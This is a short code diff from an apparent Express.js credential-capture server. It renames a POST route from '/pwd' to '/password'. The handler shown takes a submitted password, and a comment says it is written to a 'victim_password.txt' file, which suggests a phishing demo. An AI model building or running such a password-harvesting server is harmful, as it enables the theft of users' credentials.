@@ -93,7 +93,7 @@ app.get('/', (req, res) => {
 });
 
 
-app.post('/pwd', (req, res) => {
+app.post('/password', (req, res) => {
     // In POST request the password  that the client entered is in the body 
     const password = req.body.password;
     // Write the given password in the 'victim_password.txt' file 
